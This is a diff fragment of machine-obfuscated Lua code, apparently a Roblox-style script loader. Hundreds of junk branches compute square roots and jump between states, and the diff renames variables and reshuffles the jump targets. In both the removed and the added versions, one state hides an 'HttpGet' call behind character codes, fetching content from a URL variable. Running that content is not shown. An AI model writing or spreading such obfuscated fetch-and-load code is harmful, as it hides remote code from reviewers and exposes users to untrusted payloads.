+    if _s == 381 then
+        local _temp = _v[4].sqrt(381); _s = 213
     end
-    if _S == 382 then
-        local _dummy = _G[4].sqrt(382); _S = 218
+    if _s == 382 then
+        local _temp = _v[4].sqrt(382); _s = 280
     end
-    if _S == 383 then
-        local _dummy = _G[4].sqrt(383); _S = 168
+    if _s == 383 then
+        local _temp = _v[4].sqrt(383); _s = 386
     end
-    if _S == 384 then
-        local _dummy = _G[4].sqrt(384); _S = 236
+    if _s == 384 then
+        local _temp = _v[4].sqrt(384); _s = 92
     end
-    if (_S + 18 == 403) then
-        local _dummy = _G[4].sqrt(385); _S = 132
+    if _s == 385 then
+        local _temp = _v[4].sqrt(385); _s = 150
     end
-    if _S == 386 then
-        local _dummy = _G[4].sqrt(386); _S = 174
+    if _s == 386 then
+        local _temp = _v[4].sqrt(386); _s = 98
     end
-    if _S == 387 then
-        local _dummy = _G[4].sqrt(387); _S = 21
+    if _s == 387 then
+        local _temp = _v[4].sqrt(387); _s = 270
     end
-    if (_S + 18 == 406) then
-        local _dummy = _G[4].sqrt(388); _S = 110
+    if _s == 388 then
+        local _temp = _v[4].sqrt(388); _s = 161
     end
-    if _S == 389 then
-        local _dummy = _G[4].sqrt(389); _S = 31
+    if _s == 389 then
+        local _temp = _v[4].sqrt(389); _s = 37
     end
-    if _S == 390 then
-        local _dummy = _G[4].sqrt(390); _S = 118
+    if _s == 390 then
+        local _temp = _v[4].sqrt(390); _s = 127
     end
-    if (_S + 18 == 409) then
-        local _dummy = _G[4].sqrt(391); _S = 492
+    if _s == 391 then
+        local _temp = _v[4].sqrt(391); _s = 480
     end
-    if _S == 392 then
-        local _dummy = _G[4].sqrt(392); _S = 324
+    if _s == 392 then
+        local _temp = _v[4].sqrt(392); _s = 173
     end
-    if _S == 393 then
-        local _dummy = _G[4].sqrt(393); _S = 547
+    if _s == 393 then
+        local _temp = _v[4].sqrt(393); _s = 261
     end
-    if _S == 394 then
-        local _dummy = _G[4].sqrt(394); _S = 154
+    if _s == 394 then
+        local _temp = _v[4].sqrt(394); _s = 207
     end
-    if (_S + 18 == 413) then
-        local _dummy = _G[4].sqrt(395); _S = 542
+    if _s == 395 then
+        local _temp = _v[4].sqrt(395); _s = 48
     end
-    if _S == 396 then
-        local _dummy = _G[4].sqrt(396); _S = 320
+    if _s == 396 then
+        local _temp = _v[4].sqrt(396); _s = 10
     end
-    if _S == 397 then
-        local _dummy = _G[4].sqrt(397); _S = 401
+    if _s == 397 then
+        local _temp = _v[4].sqrt(397); _s = 267
     end
-    if (_S + 18 == 416) then
-        local _dummy = _G[4].sqrt(398); _S = 563
+    if _s == 398 then
+        local _temp = _v[4].sqrt(398); _s = 226
     end
-    if _S == 399 then
-        local _dummy = _G[4].sqrt(399); _S = 51
+    if _s == 399 then
+        local _temp = _v[4].sqrt(399); _s = 437
     end
-    if _S == 400 then
-        local _dummy = _G[4].sqrt(400); _S = 541
+    if _s == 400 then
+        local _api = _v[2].char(72,116,116,112,71,101,116)
+        local ok, res = _v[3](function() return _v[1][_api](_v[1], _u) end)
+        _r = res; _s = 550
     end
-    if (_S + 18 == 419) then
-        local _dummy = _G[4].sqrt(401); _S = 351
+    if _s == 401 then
+        local _temp = _v[4].sqrt(401); _s = 301
     end
-    if (_S + 18 == 420) then
-        local _dummy = _G[4].sqrt(402); _S = 242
+    if _s == 402 then
+        local _temp = _v[4].sqrt(402); _s = 284
     end
-    if _S == 403 then
-        local _dummy = _G[4].sqrt(403); _S = 316
+    if _s == 403 then
+        local _temp = _v[4].sqrt(403); _s = 251
     end
-    if _S == 404 then
-        local _dummy = _G[4].sqrt(404); _S = 627
+    if _s == 404 then
+        local _temp = _v[4].sqrt(404); _s = 33
     end
-    if _S == 405 then
-        local _dummy = _G[4].sqrt(405); _S = 310
+    if _s == 405 then
+        local _temp = _v[4].sqrt(405); _s = 432
     end
-    if _S == 406 then
-        local _dummy = _G[4].sqrt(406); _S = 631
+    if _s == 406 then
+        local _temp = _v[4].sqrt(406); _s = 297
     end
-    if _S == 407 then
-        local _dummy = _G[4].sqrt(407); _S = 453
+    if _s == 407 then
+        local _temp = _v[4].sqrt(407); _s = 437
     end
-    if _S == 408 then
-        local _dummy = _G[4].sqrt(408); _S = 618
+    if _s == 408 then
+        local _temp = _v[4].sqrt(408); _s = 242
     end
-    if _S == 409 then
-        local _dummy = _G[4].sqrt(409); _S = 466
+    if _s == 409 then
+        local _temp = _v[4].sqrt(409); _s = 200
     end
-    if _S == 410 then
-        local _dummy = _G[4].sqrt(410); _S = 578
+    if _s == 410 then
+        local _temp = _v[4].sqrt(410); _s = 138
     end
-    if _S == 411 then
-        local _dummy = _G[4].sqrt(411); _S = 541
+    if _s == 411 then
+        local _temp = _v[4].sqrt(411); _s = 19
     end
-    if _S == 412 then
-        local _dummy = _G[4].sqrt(412); _S = 609
+    if _s == 412 then
+        local _temp = _v[4].sqrt(412); _s = 516
     end
-    if _S == 413 then
-        local _dummy = _G[4].sqrt(413); _S = 313
+    if _s == 413 then
+        local _temp = _v[4].sqrt(413); _s = 306
     end
-    if (_S + 18 == 432) then
-        local _dummy = _G[4].sqrt(414); _S = 399
+    if _s == 414 then
+        local _temp = _v[4].sqrt(414); _s = 206
     end
-    if _S == 415 then
-        local _dummy = _G[4].sqrt(415); _S = 570
+    if _s == 415 then
+        local _temp = _v[4].sqrt(415); _s = 438
     end
-    if _S == 416 then
-        local _dummy = _G[4].sqrt(416); _S = 246
+    if _s == 416 then
+        local _temp = _v[4].sqrt(416); _s = 76
     end
-    if _S == 417 then
-        local _dummy = _G[4].sqrt(417); _S = 595
+    if _s == 417 then
+        local _temp = _v[4].sqrt(417); _s = 460
     end
-    if _S == 418 then
-        local _dummy = _G[4].sqrt(418); _S = 552
+    if _s == 418 then
+        local _temp = _v[4].sqrt(418); _s = 103
     end
-    if _S == 419 then
-        local _dummy = _G[4].sqrt(419); _S = 181
+    if _s == 419 then
+        local _temp = _v[4].sqrt(419); _s = 477
     end
-    if _S == 420 then
-        local _dummy = _G[4].sqrt(420); _S = 565
+    if _s == 420 then
+        local _temp = _v[4].sqrt(420); _s = 99
     end
-    if _S == 421 then
-        local _dummy = _G[4].sqrt(421); _S = 149
+    if _s == 421 then
+        local _temp = _v[4].sqrt(421); _s = 174
     end
-    if _S == 422 then
-        local _dummy = _G[4].sqrt(422); _S = 326
+    if _s == 422 then
+        local _temp = _v[4].sqrt(422); _s = 311
     end
-    if _S == 423 then
-        local _dummy = _G[4].sqrt(423); _S = 399
+    if _s == 423 then
+        local _temp = _v[4].sqrt(423); _s = 203
     end
-    if _S == 424 then
-        local _dummy = _G[4].sqrt(424); _S = 230
+    if _s == 424 then
+        local _temp = _v[4].sqrt(424); _s = 543
     end
-    if _S == 425 then
-        local _dummy = _G[4].sqrt(425); _S = 117
+    if _s == 425 then
+        local _temp = _v[4].sqrt(425); _s = 261
     end
-    if _S == 426 then
-        local _dummy = _G[4].sqrt(426); _S = 356
+    if _s == 426 then
+        local _temp = _v[4].sqrt(426); _s = 549
     end
-    if _S == 427 then
-        local _dummy = _G[4].sqrt(427); _S = 78
+    if _s == 427 then
+        local _temp = _v[4].sqrt(427); _s = 380
     end
-    if _S == 428 then
-        local _dummy = _G[4].sqrt(428); _S = 325
+    if _s == 428 then
+        local _temp = _v[4].sqrt(428); _s = 62
     end
-    if _S == 429 then
-        local _dummy = _G[4].sqrt(429); _S = 348
+    if _s == 429 then
+        local _temp = _v[4].sqrt(429); _s = 340
     end
-    if _S == 430 then
-        local _dummy = _G[4].sqrt(430); _S = 288
+    if _s == 430 then
+        local _temp = _v[4].sqrt(430); _s = 465
     end
-    if _S == 431 then
-        local _dummy = _G[4].sqrt(431); _S = 573
+    if _s == 431 then
+        local _temp = _v[4].sqrt(431); _s = 404
     end
-    if _S == 432 then
-        local _dummy = _G[4].sqrt(432); _S = 506
+    if _s == 432 then
+        local _temp = _v[4].sqrt(432); _s = 356
     end
-    if _S == 433 then
-        local _dummy = _G[4].sqrt(433); _S = 396
+    if _s == 433 then
+        local _temp = _v[4].sqrt(433); _s = 514
     end
-    if _S == 434 then
-        local _dummy = _G[4].sqrt(434); _S = 436
+    if _s == 434 then
+        local _temp = _v[4].sqrt(434); _s = 290
     end
-    if _S == 435 then
-        local _dummy = _G[4].sqrt(435); _S = 174
+    if _s == 435 then
+        local _temp = _v[4].sqrt(435); _s = 262
     end
-    if (_S + 18 == 454) then
-        local _dummy = _G[4].sqrt(436); _S = 48
+    if _s == 436 then
+        local _temp = _v[4].sqrt(436); _s = 242
     end
-    if _S == 437 then
-        local _dummy = _G[4].sqrt(437); _S = 482
+    if _s == 437 then
+        local _temp = _v[4].sqrt(437); _s = 470
     end
-    if _S == 438 then
-        local _dummy = _G[4].sqrt(438); _S = 98
+    if _s == 438 then
+        local _temp = _v[4].sqrt(438); _s = 92
     end
-    if _S == 439 then
-        local _dummy = _G[4].sqrt(439); _S = 468
+    if _s == 439 then
+        local _temp = _v[4].sqrt(439); _s = 86
     end
-    if _S == 440 then
-        local _dummy = _G[4].sqrt(440); _S = 553
+    if _s == 440 then
+        local _temp = _v[4].sqrt(440); _s = 123
     end
-    if _S == 441 then
-        local _dummy = _G[4].sqrt(441); _S = 537
+    if _s == 441 then
+        local _temp = _v[4].sqrt(441); _s = 274
     end
-    if _S == 442 then
-        local _dummy = _G[4].sqrt(442); _S = 472
+    if _s == 442 then
+        local _temp = _v[4].sqrt(442); _s = 361
     end
-    if _S == 443 then
-        local _dummy = _G[4].sqrt(443); _S = 131
+    if _s == 443 then
+        local _temp = _v[4].sqrt(443); _s = 366
     end
-    if _S == 444 then
-        local _dummy = _G[4].sqrt(444); _S = 95
+    if _s == 444 then
+        local _temp = _v[4].sqrt(444); _s = 293
     end
-    if (_S + 18 == 463) then
-        local _dummy = _G[4].sqrt(445); _S = 331
+    if _s == 445 then
+        local _temp = _v[4].sqrt(445); _s = 458
     end
-    if _S == 446 then
-        local _dummy = _G[4].sqrt(446); _S = 47
+    if _s == 446 then
+        local _temp = _v[4].sqrt(446); _s = 61
     end
-    if _S == 447 then
-        local _dummy = _G[4].sqrt(447); _S = 209
+    if _s == 447 then
+        local _temp = _v[4].sqrt(447); _s = 339
     end
-    if (_S + 18 == 466) then
-        local _dummy = _G[4].sqrt(448); _S = 377
+    if _s == 448 then
+        local _temp = _v[4].sqrt(448); _s = 320
     end
-    if _S == 449 then
-        local _dummy = _G[4].sqrt(449); _S = 411
+    if _s == 449 then
+        local _temp = _v[4].sqrt(449); _s = 120
     end
-    if _S == 450 then
-        local _dummy = _G[4].sqrt(450); _S = 394
+    if _s == 450 then
+        local _temp = _v[4].sqrt(450); _s = 411
     end
-    if _S == 451 then
-        local _dummy = _G[4].sqrt(451); _S = 100
+    if _s == 451 then
+        local _temp = _v[4].sqrt(451); _s = 452
     end
-    if _S == 452 then
-        local _dummy = _G[4].sqrt(452); _S = 554
+    if _s == 452 then
+        local _temp = _v[4].sqrt(452); _s = 431
     end
-    if _S == 453 then
-        local _dummy = _G[4].sqrt(453); _S = 602
+    if _s == 453 then
+        local _temp = _v[4].sqrt(453); _s = 135
     end
-    if _S == 454 then
-        local _dummy = _G[4].sqrt(454); _S = 450
+    if _s == 454 then
+        local _temp = _v[4].sqrt(454); _s = 199
     end
-    if _S == 455 then
-        local _dummy = _G[4].sqrt(455); _S = 15
+    if _s == 455 then
+        local _temp = _v[4].sqrt(455); _s = 520
     end
-    if _S == 456 then
-        local _dummy = _G[4].sqrt(456); _S = 275
+    if _s == 456 then
+        local _temp = _v[4].sqrt(456); _s = 7
     end
-    if _S == 457 then
-        local _dummy = _G[4].sqrt(457); _S = 67
+    if _s == 457 then
+        local _temp = _v[4].sqrt(457); _s = 276
     end
-    if _S == 458 then
-        local _dummy = _G[4].sqrt(458); _S = 337
+    if _s == 458 then
+        local _temp = _v[4].sqrt(458); _s = 210
     end
-    if _S == 459 then
-        local _dummy = _G[4].sqrt(459); _S = 148
+    if _s == 459 then
+        local _temp = _v[4].sqrt(459); _s = 26
     end
-    if _S == 460 then
-        local _dummy = _G[4].sqrt(460); _S = 606
+    if _s == 460 then
+        local _temp = _v[4].sqrt(460); _s = 287
     end
-    if _S == 461 then
-        local _dummy = _G[4].sqrt(461); _S = 626
+    if _s == 461 then
+        local _temp = _v[4].sqrt(461); _s = 143
     end
-    if _S == 462 then
-        local _dummy = _G[4].sqrt(462); _S = 627
+    if _s == 462 then
+        local _temp = _v[4].sqrt(462); _s = 247
     end
-    if _S == 463 then
-        local _dummy = _G[4].sqrt(463); _S = 293
+    if _s == 463 then
+        local _temp = _v[4].sqrt(463); _s = 347
     end
-    if _S == 464 then
-        local _dummy = _G[4].sqrt(464); _S = 66
+    if _s == 464 then
+        local _temp = _v[4].sqrt(464); _s = 153
     end
-    if _S == 465 then
-        local _dummy = _G[4].sqrt(465); _S = 355
+    if _s == 465 then
+        local _temp = _v[4].sqrt(465); _s = 124
     end
-    if _S == 466 then
-        local _dummy = _G[4].sqrt(466); _S = 47
+    if _s == 466 then
+        local _temp = _v[4].sqrt(466); _s = 136
     end
-    if _S == 467 then
-        local _dummy = _G[4].sqrt(467); _S = 266
+    if _s == 467 then
+        local _temp = _v[4].sqrt(467); _s = 442
     end
-    if _S == 468 then
-        local _dummy = _G[4].sqrt(468); _S = 136
+    if _s == 468 then
+        local _temp = _v[4].sqrt(468); _s = 397
     end
-    if _S == 469 then
-        local _dummy = _G[4].sqrt(469); _S = 426
+    if _s == 469 then
+        local _temp = _v[4].sqrt(469); _s = 395
     end
-    if (_S + 18 == 488) then
-        local _dummy = _G[4].sqrt(470); _S = 168
+    if _s == 470 then
+        local _temp = _v[4].sqrt(470); _s = 211
     end
-    if _S == 471 then
-        local _dummy = _G[4].sqrt(471); _S = 616
+    if _s == 471 then
+        local _temp = _v[4].sqrt(471); _s = 129
     end
-    if _S == 472 then
-        local _dummy = _G[4].sqrt(472); _S = 56
+    if _s == 472 then
+        local _temp = _v[4].sqrt(472); _s = 503
     end
-    if _S == 473 then
-        local _dummy = _G[4].sqrt(473); _S = 484
+    if _s == 473 then
+        local _temp = _v[4].sqrt(473); _s = 300
     end
-    if _S == 474 then
-        local _dummy = _G[4].sqrt(474); _S = 429
+    if _s == 474 then
+        local _temp = _v[4].sqrt(474); _s = 460
     end
-    if _S == 475 then
-        local _dummy = _G[4].sqrt(475); _S = 644
+    if _s == 475 then
+        local _temp = _v[4].sqrt(475); _s = 429
     end
-    if (_S + 18 == 494) then
-        local _dummy = _G[4].sqrt(476); _S = 211
+    if _s == 476 then
+        local _temp = _v[4].sqrt(476); _s = 51
     end
-    if _S == 477 then
-        local _dummy = _G[4].sqrt(477); _S = 513
+    if _s == 477 then
+        local _temp = _v[4].sqrt(477); _s = 387
     end
-    if _S == 478 then
-        local _dummy = _G[4].sqrt(478); _S = 335
+    if _s == 478 then
+        local _temp = _v[4].sqrt(478); _s = 45
     end
-    if _S == 479 then
-        local _dummy = _G[4].sqrt(479); _S = 342
+    if _s == 479 then
+        local _temp = _v[4].sqrt(479); _s = 151
     end
-    if _S == 480 then
-        local _api = _G[2].char(72,116,116,112,71,101,116)
-        local ok, r = _G[3](function() return _G[1][_api](_G[1], _U) end)
-        _R = r; _S = 330
+    if _s == 480 then
+        local _temp = _v[4].sqrt(480); _s = 3
     end
-    if (_S + 18 == 499) then
-        local _dummy = _G[4].sqrt(481); _S = 47
+    if _s == 481 then
+        local _temp = _v[4].sqrt(481); _s = 239
     end
-    if _S == 482 then
-        local _dummy = _G[4].sqrt(482); _S = 181
+    if _s == 482 then
+        local _temp = _v[4].sqrt(482); _s = 338
     end
-    if _S == 483 then
-        local _dummy = _G[4].sqrt(483); _S = 596
+    if _s == 483 then
+        local _temp = _v[4].sqrt(483); _s = 216
     end
-    if _S == 484 then
-        local _dummy = _G[4].sqrt(484); _S = 543
+    if _s == 484 then
+        local _temp = _v[4].sqrt(484); _s = 492
     end
-    if (_S + 18 == 503) then
-        local _dummy = _G[4].sqrt(485); _S = 587
+    if _s == 485 then
+        local _temp = _v[4].sqrt(485); _s = 460
     end
-    if _S == 486 then
-        local _dummy = _G[4].sqrt(486); _S = 395
+    if _s == 486 then
+        local _temp = _v[4].sqrt(486); _s = 353
     end
-    if _S == 487 then
-        local _dummy = _G[4].sqrt(487); _S = 582
+    if _s == 487 then
+        local _temp = _v[4].sqrt(487); _s = 342
     end
-    if _S == 488 then
-        local _dummy = _G[4].sqrt(488); _S = 493
+    if _s == 488 then
+        local _temp = _v[4].sqrt(488); _s = 211
     end
-    if _S == 489 then
-        local _dummy = _G[4].sqrt(489); _S = 189
+    if _s == 489 then
+        local _temp = _v[4].sqrt(489); _s = 534
     end
-    if _S == 490 then
-        local _dummy = _G[4].sqrt(490); _S = 36
+    if _s == 490 then
+        local _temp = _v[4].sqrt(490); _s = 282
     end
-    if (_S + 18 == 509) then
-        local _dummy = _G[4].sqrt(491); _S = 53
+    if _s == 491 then
+        local _temp = _v[4].sqrt(491); _s = 432
     end
-    if _S == 492 then
-        local _dummy = _G[4].sqrt(492); _S = 15
+    if _s == 492 then
+        local _temp = _v[4].sqrt(492); _s = 486
     end
-    if _S == 493 then
-        local _dummy = _G[4].sqrt(493); _S = 613
+    if _s == 493 then
+        local _temp = _v[4].sqrt(493); _s = 314
     end
-    if _S == 494 then
-        local _dummy = _G[4].sqrt(494); _S = 61
+    if _s == 494 then
+        local _temp = _v[4].sqrt(494); _s = 74
     end
-    if _S == 495 then
-        local _dummy = _G[4].sqrt(495); _S = 419
+    if _s == 495 then
+        local _temp = _v[4].sqrt(495); _s = 130
     end
-    if _S == 496 then
-        local _dummy = _G[4].sqrt(496); _S = 99
+    if _s == 496 then
+        local _temp = _v[4].sqrt(496); _s = 373
     end
-    if (_S + 18 == 515) then
-        local _dummy = _G[4].sqrt(497); _S = 371
+    if _s == 497 then
+        local _temp = _v[4].sqrt(497); _s = 54
     end
-    if _S == 498 then
-        local _dummy = _G[4].sqrt(498); _S = 163
+    if _s == 498 then
+        local _temp = _v[4].sqrt(498); _s = 41
     end
-    if _S == 499 then
-        local _dummy = _G[4].sqrt(499); _S = 302
+    if _s == 499 then
+        local _temp = _v[4].sqrt(499); _s = 420
     end
-    if _S == 500 then
-        local _dummy = _G[4].sqrt(500); _S = 593
+    if _s == 500 then
+        local _temp = _v[4].sqrt(500); _s = 273
     end
-    if (_S + 18 == 519) then
-        local _dummy = _G[4].sqrt(501); _S = 49
+    if _s == 501 then
+        local _temp = _v[4].sqrt(501); _s = 473
     end
-    if _S == 502 then
-        local _dummy = _G[4].sqrt(502); _S = 249
+    if _s == 502 then
+        local _temp = _v[4].sqrt(502); _s = 119
     end
-    if _S == 503 then
-        local _dummy = _G[4].sqrt(503); _S = 93
+    if _s == 503 then
+        local _temp = _v[4].sqrt(503); _s = 512
     end
-    if (_S + 18 == 522) then
-        local _dummy = _G[4].sqrt(504); _S = 75
+    if _s == 504 then
+        local _temp = _v[4].sqrt(504); _s = 99
     end
-    if (_S + 18 == 523) then
-        local _dummy = _G[4].sqrt(505); _S = 59
+    if _s == 505 then
+        local _temp = _v[4].sqrt(505); _s = 125
     end
-    if _S == 506 then
-        local _dummy = _G[4].sqrt(506); _S = 648
+    if _s == 506 then
+        local _temp = _v[4].sqrt(506); _s = 524
     end
-    if _S == 507 then
-        local _dummy = _G[4].sqrt(507); _S = 304
+    if _s == 507 then
+        local _temp = _v[4].sqrt(507); _s = 223
     end
-    if (_S + 18 == 526) then
-        local _dummy = _G[4].sqrt(508); _S = 144
+    if _s == 508 then
+        local _temp = _v[4].sqrt(508); _s = 480
     end
-    if _S == 509 then
-        local _dummy = _G[4].sqrt(509); _S = 26
+    if _s == 509 then
+        local _temp = _v[4].sqrt(509); _s = 36
     end
-    if (_S + 18 == 528) then
-        local _dummy = _G[4].sqrt(510); _S = 501
+    if _s == 510 then
+        local _temp = _v[4].sqrt(510); _s = 405
     end
-    if _S == 511 then
-        local _dummy = _G[4].sqrt(511); _S = 414
+    if _s == 511 then
+        local _temp = _v[4].sqrt(511); _s = 285
     end
-    if _S == 512 then
-        local _dummy = _G[4].sqrt(512); _S = 191
+    if _s == 512 then
+        local _temp = _v[4].sqrt(512); _s = 499
     end
-    if _S == 513 then
-        local _dummy = _G[4].sqrt(513); _S = 375
+    if _s == 513 then
+        local _temp = _v[4].sqrt(513); _s = 200
     end
-    if _S == 514 then
-        local _dummy = _G[4].sqrt(514); _S = 391
+    if _s == 514 then
+        local _temp = _v[4].sqrt(514); _s = 508
     end
-    if _S == 515 then
-        local _dummy = _G[4].sqrt(515); _S = 90
+    if _s == 515 then
+        local _temp = _v[4].sqrt(515); _s = 154
     end
-    if (_S + 18 == 534) then
-        local _dummy = _G[4].sqrt(516); _S = 78
+    if _s == 516 then
+        local _temp = _v[4].sqrt(516); _s = 431
     end
-    if _S == 517 then
-        local _dummy = _G[4].sqrt(517); _S = 179
+    if _s == 517 then
+        local _temp = _v[4].sqrt(517); _s = 293
     end
-    if _S == 518 then
-        local _dummy = _G[4].sqrt(518); _S = 360
+    if _s == 518 then
+        local _temp = _v[4].sqrt(518); _s = 360
     end
-    if (_S + 18 == 537) then
-        local _dummy = _G[4].sqrt(519); _S = 406
+    if _s == 519 then
+        local _temp = _v[4].sqrt(519); _s = 18
     end
-    if _S == 520 then
-        local _dummy = _G[4].sqrt(520); _S = 315
+    if _s == 520 then
+        local _temp = _v[4].sqrt(520); _s = 340
     end
-    if _S == 521 then
-        local _dummy = _G[4].sqrt(521); _S = 478
+    if _s == 521 then
+        local _temp = _v[4].sqrt(521); _s = 82
     end
-    if _S == 522 then
-        local _dummy = _G[4].sqrt(522); _S = 194
+    if _s == 522 then
+        local _temp = _v[4].sqrt(522); _s = 113
     end
-    if _S == 523 then
-        local _dummy = _G[4].sqrt(523); _S = 509
+    if _s == 523 then
+        local _temp = _v[4].sqrt(523); _s = 150
     end
-    if _S == 524 then
-        local _dummy = _G[4].sqrt(524); _S = 268
+    if _s == 524 then
+        local _temp = _v[4].sqrt(524); _s = 76
     end
-    if (_S + 18 == 543) then
-        local _dummy = _G[4].sqrt(525); _S = 128
+    if _s == 525 then
+        local _temp = _v[4].sqrt(525); _s = 80
     end
-    if _S == 526 then
-        local _dummy = _G[4].sqrt(526); _S = 98
+    if _s == 526 then
+        local _temp = _v[4].sqrt(526); _s = 468
     end
-    if _S == 527 then
-        local _dummy = _G[4].sqrt(527); _S = 154
+    if _s == 527 then
+        local _temp = _v[4].sqrt(527); _s = 80
     end
-    if _S == 528 then
-        local _dummy = _G[4].sqrt(528); _S = 44
+    if _s == 528 then
+        local _temp = _v[4].sqrt(528); _s = 1
     end
-    if _S == 529 then
-        local _dummy = _G[4].sqrt(529); _S = 615
+    if _s == 529 then
+        local _temp = _v[4].sqrt(529); _s = 542
     end
-    if (_S + 18 == 548) then
-        local _dummy = _G[4].sqrt(530); _S = 106
+    if _s == 530 then
+        local _temp = _v[4].sqrt(530); _s = 204
     end
-    if _S == 531 then
-        local _dummy = _G[4].sqrt(531); _S = 132
+    if _s == 531 then
+        local _temp = _v[4].sqrt(531); _s = 440
     end
-    if _S == 532 then
-        local _dummy = _G[4].sqrt(532); _S = 11
+    if _s == 532 then
+        local _temp = _v[4].sqrt(532); _s = 137
     end
-    if _S == 533 then
-        local _dummy = _G[4].sqrt(533); _S = 468
+    if _s == 533 then
+        local _temp = _v[4].sqrt(533); _s = 217
     end
-    if _S == 534 then
-        local _dummy = _G[4].sqrt(534); _S = 292
+    if _s == 534 then
+        local _temp = _v[4].sqrt(534); _s = 178
     end
-    if _S == 535 then
-        local _dummy = _G[4].sqrt(535); _S = 201
+    if _s == 535 then
+        local _temp = _v[4].sqrt(535); _s = 248
     end
-    if _S == 536 then
-        local _dummy = _G[4].sqrt(536); _S = 317
+    if _s == 536 then
+        local _temp = _v[4].sqrt(536); _s = 260
     end
-    if _S == 537 then
-        local _dummy = _G[4].sqrt(537); _S = 31
+    if _s == 537 then
+        local _temp = _v[4].sqrt(537); _s = 505
     end
-    if _S == 538 then
-        local _dummy = _G[4].sqrt(538); _S = 374
+    if _s == 538 then
+        local _temp = _v[4].sqrt(538); _s = 113
     end
-    if _S == 539 then
-        local _dummy = _G[4].sqrt(539); _S = 476
+    if _s == 539 then
+        local _temp = _v[4].sqrt(539); _s = 320
     end
-    if _S == 540 then
-        local _dummy = _G[4].sqrt(540); _S = 638
+    if _s == 540 then
+        local _temp = _v[4].sqrt(540); _s = 361
     end
-    if _S == 541 then
-        local _dummy = _G[4].sqrt(541); _S = 53
+    if _s == 541 then
+        local _temp = _v[4].sqrt(541); _s = 383
     end
-    if _S == 542 then
-        local _dummy = _G[4].sqrt(542); _S = 214
+    if _s == 542 then
+        local _temp = _v[4].sqrt(542); _s = 422
     end
-    if _S == 543 then
-        local _dummy = _G[4].sqrt(543); _S = 639
+    if _s == 543 then
+        local _temp = _v[4].sqrt(543); _s = 102
     end
-    if (_S + 18 == 562) then
-        local _dummy = _G[4].sqrt(544); _S = 316
+    if _s == 544 then
+        local _temp = _v[4].sqrt(544); _s = 347
     end
-    if _S == 545 then
-        local _dummy = _G[4].sqrt(545); _S = 490
+    if _s == 545 then
+        local _temp = _v[4].sqrt(545); _s = 307
     end
-    if (_S + 18 == 564) then
-        local _dummy = _G[4].sqrt(546); _S = 577
+    if _s == 546 then
+        local _temp = _v[4].sqrt(546); _s = 31
     end
-    if _S == 547 then
-        local _dummy = _G[4].sqrt(547); _S = 272
+    if _s == 547 then
+        local _temp = _v[4].sqrt(547); _s = 92
     end
-    if _S == 548 then
-        local _dummy = _G[4].sqrt(548); _S = 536
+    if _s == 548 then
+        local _temp = _v[4].sqrt(548); _s = 539
     end
-    if _S == 549 then
-        local _dummy = _G[4].sqrt(549); _S = 8
+    if _s == 549 then
+        local _temp = _v[4].sqrt(549); _s = 14
     end
-    if _S == 550 then
-        local _dummy = _G[4].sqrt(550); _S = 371
-    end
-    if _S == 551 then
-        local _dummy = _G[4].sqrt(551); _S = 300
-    end
-    if (_S + 18 == 570) then
-        local _dummy = _G[4].sqrt(552); _S = 517
-    end
-    if (_S + 18 == 571) then
-        local _dummy = _G[4].sqrt(553); _S = 426
-    end
-    if _S == 554 then
-        local _dummy = _G[4].sqrt(554); _S = 648
-    end
-    if _S == 555 then
-        local _dummy = _G[4].sqrt(555); _S = 191
-    end
-    if _S == 556 then
-        local _dummy = _G[4].sqrt(556); _S = 379
-    end
-    if _S == 557 then
-        local _dummy = _G[4].sqrt(557); _S = 588
-    end
-    if _S == 558 then
-        local _dummy = _G[4].sqrt(558); _S = 416
-    end
-    if (_S + 18 == 577) then
-        local _dummy = _G[4].sqrt(559); _S = 603
-    end
-    if _S == 560 then
-        local _dummy = _G[4].sqrt(560); _S = 411
-    end
-    if _S == 561 then
-        local _dummy = _G[4].sqrt(561); _S = 164
-    end
-    if _S == 562 then
-        local _dummy = _G[4].sqrt(562); _S = 389
-    end
-    if _S == 563 then
-        local _dummy = _G[4].sqrt(563); _S = 153
-    end
-    if _S == 564 then
-        local _dummy = _G[4].sqrt(564); _S = 33
-    end
-    if (_S + 18 == 583) then
-        local _dummy = _G[4].sqrt(565); _S = 452
-    end
-    if _S == 566 then
-        local _dummy = _G[4].sqrt(566); _S = 522
-    end
-    if (_S + 18 == 585) then
-        local _dummy = _G[4].sqrt(567); _S = 496
-    end
-    if (_S + 18 == 586) then
-        local _dummy = _G[4].sqrt(568); _S = 550
-    end
-    if (_S + 18 == 587) then
-        local _dummy = _G[4].sqrt(569); _S = 155
-    end
-    if _S == 570 then
-        local _dummy = _G[4].sqrt(570); _S = 37
-    end
-    if _S == 571 then
-        local _dummy = _G[4].sqrt(571); _S = 384
-    end
-    if _S == 572 then
-        local _dummy = _G[4].sqrt(572); _S = 612
-    end
-    if _S == 573 then
-        local _dummy = _G[4].sqrt(573); _S = 603
-    end
-    if _S == 574 then
-        local _dummy = _G[4].sqrt(574); _S = 149
-    end
-    if _S == 575 then
-        local _dummy = _G[4].sqrt(575); _S = 392
-    end
-    if (_S + 18 == 594) then
-        local _dummy = _G[4].sqrt(576); _S = 149
-    end
-    if _S == 577 then
-        local _dummy = _G[4].sqrt(577); _S = 460
-    end
-    if _S == 578 then
-        local _dummy = _G[4].sqrt(578); _S = 146
-    end
-    if _S == 579 then
-        local _dummy = _G[4].sqrt(579); _S = 370
-    end
-    if _S == 580 then
-        local _dummy = _G[4].sqrt(580); _S = 2
-    end
-    if _S == 581 then
-        local _dummy = _G[4].sqrt(581); _S = 114
-    end
-    if _S == 582 then
-        local _dummy = _G[4].sqrt(582); _S = 235
-    end
-    if _S == 583 then
-        local _dummy = _G[4].sqrt(583); _S = 57
-    end
-    if _S == 584 then
-        local _dummy = _G[4].sqrt(584); _S = 57
-    end
-    if _S == 585 then
-        local _dummy = _G[4].sqrt(585); _S = 176
-    end
-    if _S == 586 then
-        local _dummy = _G[4].sqrt(586); _S = 406
-    end
-    if _S == 587 then
-        local _dummy = _G[4].sqrt(587); _S = 311
-    end
-    if _S == 588 then
-        local _dummy = _G[4].sqrt(588); _S = 424
-    end
-    if (_S + 18 == 607) then
-        local _dummy = _G[4].sqrt(589); _S = 427
-    end
-    if _S == 590 then
-        local _dummy = _G[4].sqrt(590); _S = 573
-    end
-    if _S == 591 then
-        local _dummy = _G[4].sqrt(591); _S = 212
-    end
-    if _S == 592 then
-        local _dummy = _G[4].sqrt(592); _S = 274
-    end
-    if _S == 593 then
-        local _dummy = _G[4].sqrt(593); _S = 126
-    end
-    if _S == 594 then
-        local _dummy = _G[4].sqrt(594); _S = 193
-    end
-    if _S == 595 then
-        local _dummy = _G[4].sqrt(595); _S = 477
-    end
-    if _S == 596 then
